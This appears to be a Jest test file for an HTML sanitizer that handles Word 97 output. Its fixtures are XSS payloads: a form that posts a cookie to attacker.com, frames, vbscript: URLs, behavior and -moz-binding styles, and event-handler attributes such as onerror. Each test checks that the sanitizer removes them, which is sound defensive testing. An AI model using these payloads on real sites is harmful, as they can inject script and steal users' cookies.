/**
 * Security-focused tests for Word 97 HTML sanitizer.
 * These tests specifically target common XSS bypasses and dangerous tags.
 */
import { sanitizeHTML } from './sanitizer';

describe('sanitizer security hardening', () => {
  test('blocks form-related tags (form, input, button, select, textarea)', () => {
    const html = `
      <form action="http://attacker.com/steal">
        <input name="cookie" value="secret">
        <button type="submit">Steal</button>
        <select><option>X</option></select>
        <textarea>bad</textarea>
      </form>
    `;
    const out = sanitizeHTML(html);
    expect(out).not.toContain('<form');
    expect(out).not.toContain('<input');
    expect(out).not.toContain('<button');
    expect(out).not.toContain('<select');
    expect(out).not.toContain('<textarea');
  });

  test('blocks frames and multimedia (frame, frameset, video, audio, canvas, applet)', () => {
    const html = `
      <frameset><frame src="http://attacker.com"></frameset>
      <video src="v.mp4"></video>
      <audio src="a.mp3"></audio>
      <canvas id="c"></canvas>
      <applet code="Malicious.class"></applet>
    `;
    const out = sanitizeHTML(html);
    expect(out).not.toContain('<frame');
    expect(out).not.toContain('<frameset');
    expect(out).not.toContain('<video');
    expect(out).not.toContain('<audio');
    expect(out).not.toContain('<canvas');
    expect(out).not.toContain('<applet');
  });

  test('blocks vbscript: protocol in sensitive attributes', () => {
    const html = `
      <a href="vbscript:msgbox('XSS')">click me</a>
      <img src="vbscript:something()">
      <form action="vbscript:steal()">
    `;
    const out = sanitizeHTML(html);
    expect(out).not.toContain('vbscript:');
  });

  test('blocks additional dangerous style properties (behavior, -moz-binding)', () => {
    const html = `
      <div style="behavior: url(xss.htc);">behavior bypass</div>
      <div style="-moz-binding: url(xss.xml#xss);">moz-binding bypass</div>
    `;
    const out = sanitizeHTML(html);
    expect(out).not.toContain('behavior:');
    expect(out).not.toContain('-moz-binding:');
  });

  test('ensures all malicious attributes are removed even if multiple exist', () => {
    // This tests for bypasses that occur when attribute iteration is skipped due to mutation.
    const html = '<img onerror="alert(1)" onmouseover="alert(2)" src="x" onclick="alert(3)">';
    const out = sanitizeHTML(html);
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('onmouseover');
    expect(out).not.toContain('onclick');
  });
});
